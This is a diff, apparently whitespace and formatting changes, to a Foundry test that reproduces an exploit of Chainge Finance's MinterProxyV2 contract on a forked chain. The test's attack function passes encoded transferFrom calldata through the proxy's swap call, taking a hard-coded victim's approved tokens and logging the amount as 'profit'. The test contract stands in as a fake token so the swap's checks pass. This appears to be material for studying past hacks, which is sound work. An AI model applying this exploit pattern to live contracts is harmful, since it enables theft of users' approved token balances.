@@ -29,7 +29,9 @@ interface IBEP20 {
     function symbol() external view returns (string memory);
     function name() external view returns (string memory);
     function getOwner() external view returns (address);
-    function balanceOf(address account) external view returns (uint256);
+    function balanceOf(
+        address account
+    ) external view returns (uint256);
     function transfer(address recipient, uint256 amount) external returns (bool);
     function allowance(address _owner, address spender) external view returns (uint256);
     function approve(address spender, uint256 amount) external returns (bool);
@@ -68,7 +70,7 @@ contract ChaingeFinanceTest is Test {
     address constant victim = 0x8A4AA176007196D48d39C89402d3753c39AE64c1;
     MinterProxyV2 minterproxy = MinterProxyV2(0x80a0D7A6FD2A22982Ce282933b384568E5c852bF);
     uint256 balance;
-    
+
     uint256 blocknumToForkFrom = 37_880_387;
 
     function setUp() public {
@@ -91,42 +93,51 @@ contract ChaingeFinanceTest is Test {
             address(eth)
         ];
 
-        for (uint i = 0; i < targetToken.length; i++) {
+        for (uint256 i = 0; i < targetToken.length; i++) {
             _attack(targetToken[i]);
         }
     }
 
-    function _attack(address targetToken) private {
+    function _attack(
+        address targetToken
+    ) private {
         uint256 Balance = IBEP20(targetToken).balanceOf(victim);
         uint256 Allowance = IBEP20(targetToken).allowance(victim, address(minterproxy));
-        uint256 amount = Balance < Allowance? Balance : Allowance;
+        uint256 amount = Balance < Allowance ? Balance : Allowance;
         if (amount == 0) {
             emit log_named_string("No allowed targetToken", IBEP20(targetToken).name());
             return;
         }
-        bytes memory transferFromData = abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, address(this), amount);
-        minterproxy.swap(address(this), 1, targetToken, address(this), address(this), 1, transferFromData, bytes(hex"00"));
+        bytes memory transferFromData =
+            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, address(this), amount);
+        minterproxy.swap(
+            address(this), 1, targetToken, address(this), address(this), 1, transferFromData, bytes(hex"00")
+        );
         emit log_named_string("targetToken", IBEP20(targetToken).name());
-        emit log_named_decimal_uint("profit", IBEP20(targetToken).balanceOf(address(this)), IBEP20(targetToken).decimals());
+        emit log_named_decimal_uint(
+            "profit", IBEP20(targetToken).balanceOf(address(this)), IBEP20(targetToken).decimals()
+        );
     }
 
-    function balanceOf(address /*account*/) external view returns (uint256) {
+    function balanceOf(
+        address /*account*/
+    ) external view returns (uint256) {
         return balance;
     }
 
-    function transfer(address /*recipient*/, uint256 /*amount*/) external pure returns (bool) {
+    function transfer(address, /*recipient*/ uint256 /*amount*/ ) external pure returns (bool) {
         return true;
     }
 
-    function allowance(address /*_owner*/, address /*spender*/) external pure returns (uint256) {
+    function allowance(address, /*_owner*/ address /*spender*/ ) external pure returns (uint256) {
         return type(uint256).max;
     }
 
-    function approve(address /*spender*/, uint256 /*amount*/) external pure returns (bool) {
+    function approve(address, /*spender*/ uint256 /*amount*/ ) external pure returns (bool) {
         return true;
     }
 
-    function transferFrom(address /*sender*/, address /*recipient*/, uint256 amount) external returns (bool) {
+    function transferFrom(address, /*sender*/ address, /*recipient*/ uint256 amount) external returns (bool) {
         balance += amount;
         return true;
     }
